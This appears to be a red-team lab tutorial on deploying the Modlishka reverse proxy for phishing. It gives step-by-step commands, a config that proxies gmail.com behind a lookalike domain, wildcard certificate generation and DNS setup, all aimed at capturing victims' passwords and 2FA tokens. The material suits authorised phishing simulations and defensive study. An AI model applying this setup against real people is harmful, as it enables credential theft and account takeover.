# Phishing with Modlishka Reverse HTTP Proxy

This lab shows how to setup a reverse HTTP proxy `Modlishka` that can be used in phishing campaigns to steal user passwords and 2FA tokens. Modlishka makes this possible, because it sits in the middle between the website you as an attacker are impersonating and the victim (MITM) while recording all the traffic/tokens/passwords that traverse it.

### Setup

Let's start off by building a new DigitalOcean droplet, the smallest is more than enough:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT3Wwfnnbn0J8xgzZ%2FAnnotation%202019-06-25%20214151.png?alt=media\&token=b1fa7c3f-f4c5-404b-9342-8db92af453f0)

Once logged on, install certbot and download modlishka binary itself:

```bash
apt install certbot
wget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64
chmod +x Modlishka-linux-amd64 ; ls -lah
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT9ga7bDsW9ghRRgY%2FAnnotation%202019-06-25%20214300.png?alt=media\&token=42a4c407-1ba5-45ef-90e1-b65f97379636)

### Modlishka Configuration

Let's create a configuration file for modlishka:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTFMH3mWerGfyOEOV%2FAnnotation%202019-06-25%20214425.png?alt=media\&token=88207ce2-73be-4995-bf83-ccdebc499b0b)

{% code title="modlishka.json" %}
```javascript
{
  //domain that you will be tricking your victim of visiting
  "proxyDomain": "redteam.me",
  "listeningAddress": "0.0.0.0",

  //domain that you want your victim to think they are visiting
  "target": "gmail.com",
  "targetResources": "",
  "targetRules":         "PC9oZWFkPg==:",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "requests.log",
  "plugins": "all",
  "cert": "",
  "certKey": "",
  "certPool": ""
}
```
{% endcode %}

### Wildcard Certificates

Important - let's generate a wildcard certificate for my domain I want my phishing victims to land on `*.redteam.me`:

```csharp
certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.redteam.me --email noreply@live.com
```

This will generate a challenge code as shown below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTLunFfm_iKTxk2ex%2FAnnotation%202019-06-25%20214749.png?alt=media\&token=45332bc7-e93e-4fad-a45e-53dabc5d63cf)

We need to create a DNS TXT record in the DNS management console for redteam.me, which in my case is in Digital Ocean:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTP6nWIhABPjfkYqM%2FAnnotation%202019-06-25%20214849.png?alt=media\&token=72548338-2fb0-43a3-b08b-ecafe031ff32)

Once the DNS TXT record is created, continue with the certificate generation:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTZBUf3IYKGYnw8A-%2FAnnotation%202019-06-25%20214924.png?alt=media\&token=1fca766c-5d80-479a-808d-2844a0b96461)

Once certificates are generated, we need to convert them to a format suitable to be embedded into JSON objects:

```bash
awk '{printf "%s\\n", $0}' /etc/letsencrypt/live/redteam.me/fullchain.pem
awk '{printf "%s\\n", $0}' /etc/letsencrypt/live/redteam.me/privkey.pem
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTg4wQyv650OJ3iDA%2FAnnotation%202019-06-25%20215107.png?alt=media\&token=50e5cf73-0abc-4288-bd25-6d77c18511a2)

Once that is done, copy over the contents of the certs into the config - `fullchain.pem` into the `cert` and `privkey.pem` into the `certKey`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTkpsH6Ip5K0TvQIt%2FAnnotation%202019-06-25%20215155.png?alt=media\&token=ee1333c4-e0ba-40d1-b4a1-b843ddb18b7a)

### More DNS Records

Let's create an A record for the root host `@` that simply points to the droplet's IP:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTp-GjlgmdT-c-g4T%2FAnnotation%202019-06-25%20215308.png?alt=media\&token=33ba2e05-a684-4d78-b750-d3fa8326c68a)

This is very important - we need a `CNAME` record for any host/subdomain `*` pointing to `@`

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTu8I9q-pAD0c5HDZ%2FAnnotation%202019-06-25%20215702.png?alt=media\&token=b739db5f-3dce-4ce1-836c-faf61f35100e)

### Launching Modlishka

We are now ready to start the test by launching modlishka and giving it the modlishka.json config file:

```csharp
./Modlishka-linux-amd64 -config modlishka.json
```

Below shows how by visiting a redteam.me, I get presented with contents of gmail.com - indicating that Modlishka and the MITM works. Again, it is important to call it out - we did not create any copies or templates of the targeted website - the victim is actually browsing gmail, it's just that it is being served through Modlishka where the traffic is inspected and passwords are captured:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFU2dkA0CS1OQJS4J5%2Fmodlishka.gif?alt=media\&token=56f21a0e-a915-4478-9f7b-1503214d7882)

### References

{% embed url="https://github.com/drk1wi/Modlishka" %}
